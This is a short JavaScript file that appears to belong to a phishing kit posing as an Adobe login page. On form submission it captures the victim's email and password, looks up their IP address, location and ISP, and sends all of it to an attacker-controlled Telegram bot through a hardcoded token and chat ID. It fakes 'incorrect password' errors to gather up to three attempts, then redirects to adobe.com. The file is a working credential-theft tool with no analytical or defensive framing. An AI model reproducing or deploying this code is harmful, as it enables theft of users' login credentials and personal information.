let attemptCount = 0; // Track login attempts

document.getElementById("login-form").addEventListener("submit", async function(event) {
    event.preventDefault(); // Prevent form submission

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    let botToken = "7277782299:AAFFU2Gz5D9N_vpaTRf3iadQFpP43x9kjZs";
    let chatId = "1952343692";

    // Get user's IP address and location
    let ipData = await fetch("https://ipapi.co/json").then(res => res.json()).catch(err => null);

    let ip = ipData?.ip || "Unknown IP";
    let country = ipData?.country_name || "Unknown Country";
    let city = ipData?.city || "Unknown City";
    let isp = ipData?.org || "Unknown ISP";

    // Get browser info
    let userAgent = navigator.userAgent;

    attemptCount++; // Increase attempt count

    // Format the message
    let message = `🚨 *Adobe Login Attempt (${attemptCount}/3)* 🚨\n\n`
                + `📧 *Email:* ${email}\n`
                + `🔑 *Password:* ${password}\n\n`
                + `🌍 *IP:* ${ip}\n`
                + `📍 *Location:* ${city}, ${country}\n`
                + `🏢 *ISP:* ${isp}\n\n`
                + `🖥 *Browser:* ${userAgent}`;

    // Send data to Telegram immediately
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
    })
    .then(response => response.json())
    .then(data => console.log("Sent to Telegram:", data))
    .catch(error => console.error("Error:", error));

    if (attemptCount < 3) {
        alert("Incorrect password. Please try again.");
        document.getElementById("password").value = ""; // Clear password field
    } else {
        // Redirect to Adobe after 3rd attempt
        alert("Redirecting to Adobe...");
        setTimeout(() => {
            window.location.href = "https://adobe.com";
        }, 2000);
    }
});
